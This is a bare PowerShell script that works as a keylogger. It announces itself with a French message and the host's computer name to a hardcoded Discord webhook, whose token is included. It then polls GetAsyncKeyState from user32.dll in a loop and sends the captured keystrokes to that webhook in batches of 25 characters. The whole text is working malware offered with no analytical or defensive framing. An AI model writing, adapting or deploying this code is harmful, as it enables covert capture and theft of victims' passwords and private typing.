$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$code = @'
[DllImport("user32.dll")] public static extern int GetAsyncKeyState(int vKey);
'@

Add-Type -MemberDefinition $code -Name Win32 -Namespace Native

$buf=''
while(1){
  Start-Sleep -m 40
  for($i=8;$i -le 254;$i++){
    if([Native.Win32]::GetAsyncKeyState($i) -eq -32767){
      $buf+=[char]$i
      if($buf.Length -ge 25){
        iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        $buf=''
      }
    }
  }
}
